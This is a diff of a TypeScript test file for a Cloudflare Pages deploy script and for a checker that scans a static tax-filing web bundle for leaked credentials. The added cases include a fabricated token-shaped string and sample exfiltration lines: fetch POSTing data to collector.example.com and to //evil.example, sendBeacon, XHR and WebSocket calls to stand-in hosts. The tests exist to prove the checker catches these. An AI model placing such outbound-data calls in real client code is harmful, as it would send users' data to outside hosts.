@@ -123,11 +123,20 @@ describe(`Cloudflare Pages config for the static client`, () => {
     expect(script).toContain(`npm ci --ignore-scripts`);
     expect(script).not.toMatch(/npx\b/);
     // The build and the install run without the Cloudflare credentials; stray VITE_*/REACT_APP_* stop the script.
-    expect(script).toMatch(/nocreds\(\) \{ env -u CLOUDFLARE_API_TOKEN -u CLOUDFLARE_ACCOUNT_ID "\$@"; \}/);
+    expect(script).toMatch(
+      /nocreds\(\) \{ env -u CLOUDFLARE_API_TOKEN -u CLOUDFLARE_ACCOUNT_ID -u CLOUDFLARE_API_KEY "\$@"; \}/
+    );
+    expect(script).toContain(`nocreds "$HERE/build.sh"`);
+    // The credential check runs on the staged site before the upload.
+    expect(script.indexOf(`checkNoSecrets.mjs`)).toBeGreaterThan(-1);
+    expect(script.indexOf(`checkNoSecrets.mjs`)).toBeLessThan(script.indexOf(`pages deploy "$OUT"`));
     expect(script).toContain(`grep -E '^(VITE_|REACT_APP_)'`);
     expect(script).not.toMatch(/set -x|echo[^\n]*\$\{?CLOUDFLARE_(API_TOKEN|ACCOUNT_ID)/);
   });
 });
+
+// Built at run time so that no token-shaped literal is committed (noCommittedSecrets.test.ts).
+const FAKE_TOKEN = [`cf`, `ut_`, `A1b2C3d4`.repeat(5)].join(``);
 
 describe(`static bundle check`, () => {
   let dir = ``;
@@ -163,6 +172,18 @@ describe(`static bundle check`, () => {
 
   it(`passes a static build`, () => {
     expect(checkStaticBundle(site(good))).toEqual([]);
+  });
+
+  it(`allows links to other sites and the .invalid API, which the guard answers in the page`, () => {
+    const links = `const a="https://www.irs.gov/credits-deductions";fetch("${STATIC_BACKEND_URL}v1/taxreturns");`;
+    expect(checkStaticBundle(site({ ...good, 'df/file/assets/l.js': links }))).toEqual([]);
+  });
+
+  it(`fails on the exact value of a deploy credential, without printing it`, () => {
+    const value = `account-${crypto.randomUUID()}`;
+    const problems = checkStaticBundle(site({ ...good, 'df/file/assets/v.js': `"${value}"` }), [value]);
+    expect(problems).toEqual([`df/file/assets/v.js: contains a value of a deploy credential`]);
+    expect(problems.join(``)).not.toContain(value);
   });
 
   it.each([
@@ -302,6 +323,53 @@ describe(`static bundle check`, () => {
       `a favicon reference in the bundle`,
       { 'df/file/assets/i.js': `"/df/file/favicon/favicon-32x32.png"` },
       /references a favicon/,
+    ],
+    [`a Cloudflare API token`, { 'df/file/assets/t.js': `const t="${FAKE_TOKEN}";` }, /Cloudflare API key or token/],
+    [
+      `a Cloudflare token in a non-JS file`,
+      { 'df/file/imgs/t.svg': `<svg><!-- ${FAKE_TOKEN} --></svg>` },
+      /t\.svg: contains a Cloudflare API key or token/,
+    ],
+    [
+      `a Cloudflare credential variable name`,
+      { 'df/file/assets/t.js': `process.env.CLOUDFLARE_API_TOKEN` },
+      /Cloudflare credential variable name/,
+    ],
+    [
+      `a literal bearer token`,
+      { 'df/file/assets/t.js': `headers:{Authorization:"Bearer ${'x'.repeat(32)}"}` },
+      /literal bearer token/,
+    ],
+    [
+      `fetch to another origin`,
+      { 'df/file/assets/n.js': `fetch("https://collector.example.com/x",{method:"POST",body:r})` },
+      /fetch\(\) to https:\/\/collector\.example\.com\/x/,
+    ],
+    [
+      `fetch to a protocol-relative URL`,
+      { 'df/file/assets/n.js': `fetch('//evil.example/x')` },
+      /fetch\(\) to \/\/evil\.example\/x/,
+    ],
+    [
+      `sendBeacon to another origin`,
+      { 'df/file/assets/n.js': `navigator.sendBeacon("https://b.example/b",d)` },
+      /sendBeacon\(\) to/,
+    ],
+    [
+      `XMLHttpRequest.open to another origin`,
+      { 'df/file/assets/n.js': `x.open("POST","https://b.example/save")` },
+      /\.open\(\) to https:\/\/b\.example\/save/,
+    ],
+    [`a WebSocket URL`, { 'df/file/assets/n.js': `const u="wss://b.example/socket";` }, /WebSocket URL/],
+    [
+      `an absolute API endpoint on another origin`,
+      { 'df/file/assets/n.js': `const base="https://data.example.com/api/returns";` },
+      /data endpoint URL https:\/\/data\.example\.com\/api\//,
+    ],
+    [
+      `a telemetry endpoint`,
+      { 'df/file/assets/n.js': `const u="https://t.example.com/v1/events";` },
+      /data endpoint URL/,
     ],
   ] as [string, Record<string, string | Buffer | undefined>, RegExp][])(`fails on %s`, (_label, override, expected) => {
     const files = Object.fromEntries(
